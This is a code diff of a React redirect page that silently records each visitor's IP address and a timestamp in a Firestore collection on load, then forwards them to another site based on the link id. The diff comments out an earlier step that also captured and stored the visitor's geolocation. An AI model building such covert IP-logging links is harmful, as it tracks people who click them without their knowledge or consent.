@@ -14,55 +14,51 @@ function Test({params}) {
       
 
 
-      function ipFetch(){
-        fetch('https://api.ipify.org?format=json')
+      async function ipFetch(){
+        await fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
-        .then(data => {
+        .then(async data => {
           setIp(data.ip);
-          console.log('Your IP address is: ', ip);
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const latitude = position.coords.latitude;
-              const longitude = position.coords.longitude;
-              console.log(`Latitude: ${latitude}, Longitude: ${longitude}`)
+          console.log('Your IP address is: ',ip);
+          // navigator.geolocation.getCurrentPosition(
+          //   (position) => {
+          //     const latitude = position.coords.latitude;
+          //     const longitude = position.coords.longitude;
+          //     console.log(`Latitude: ${latitude}, Longitude: ${longitude}`)
 
-              addDoc(ipCollectionRef,{ip:data.ip, 
-                createAt: Timestamp.fromDate(new Date()), 
-                location: `${latitude} ${longitude} `})
+          //     addDoc(ipCollectionRef,{ip:data.ip, 
+          //       createAt: Timestamp.fromDate(new Date()), 
+          //       location: `${latitude} ${longitude} `})
 
-            }
-          );
+          //   }
+          // );
+
+          await addDoc(ipCollectionRef,{ip:data.ip, 
+            createAt: Timestamp.fromDate(new Date())})
+            .then(()=>{
+              switch (params.id) {
+                case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
+                  window.location.href = 'https://example.com';
+                  // redirect('https://example.com');
+                  break;
+                case 'google':
+                  window.location.href = 'https://google.com';
+                  // redirect('https://google.com');
+                  break;
+                default:
+                  console.log(params.id);
+                  break;
+              }
+            })
+
           
-          
 
-        }).then(
-          () =>{
-            switch (params.id) {
-              case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
-                window.location.href = 'https://example.com';
-                // redirect('https://example.com');
-                break;
-              case 'google':
-                window.location.href = 'https://google.com';
-                // redirect('https://google.com');
-                break;
-              default:
-                console.log(params.id);
-                break;
-            }
-          }
-        )
+        })
 
       }
 
     
       ipFetch();
-
-    
-      
-
-
-      
     }, [])
 
   return (
